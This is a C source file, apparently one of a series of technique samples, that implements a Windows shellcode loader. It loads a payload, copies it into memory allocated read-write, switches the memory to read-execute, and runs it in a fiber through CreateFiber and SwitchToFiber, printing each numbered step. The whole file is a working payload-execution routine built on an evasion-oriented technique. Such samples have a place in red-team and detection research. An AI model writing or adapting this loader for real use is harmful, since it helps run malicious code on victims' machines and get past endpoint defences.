#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "../common.h"

int main(int argc, char* argv[]) {
    BYTE* payload = NULL;
    DWORD payloadSize = 0;
    if (!LoadPayload(&payload, &payloadSize)) return 1;

    PrintStep(2, "Allocating memory (RW)");
    LPVOID execMem = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) { PrintError("VirtualAlloc failed"); return 1; }
    printf("[+] Allocated memory at: %p\n", execMem);

    PrintStep(3, "Copying payload");
    memcpy(execMem, payload, payloadSize);
    free(payload);

    PrintStep(4, "Changing memory protection (RW -> RX)");
    DWORD oldProtect;
    VirtualProtect(execMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    PrintStep(5, "Converting current thread to fiber");
    LPVOID mainFiber = ConvertThreadToFiber(NULL);
    if (!mainFiber) { PrintError("ConvertThreadToFiber failed"); return 1; }
    PrintSuccess("Main thread converted to fiber");

    PrintStep(6, "Creating payload fiber");
    LPVOID payloadFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);
    if (!payloadFiber) { PrintError("CreateFiber failed"); return 1; }
    PrintSuccess("Payload fiber created");

    PrintStep(7, "Switching to payload fiber");
    printf("[+] Executing payload in main thread at: %p\n", execMem);
    SwitchToFiber(payloadFiber);

    PrintSuccess("Returned from payload fiber");
    return 0;
}
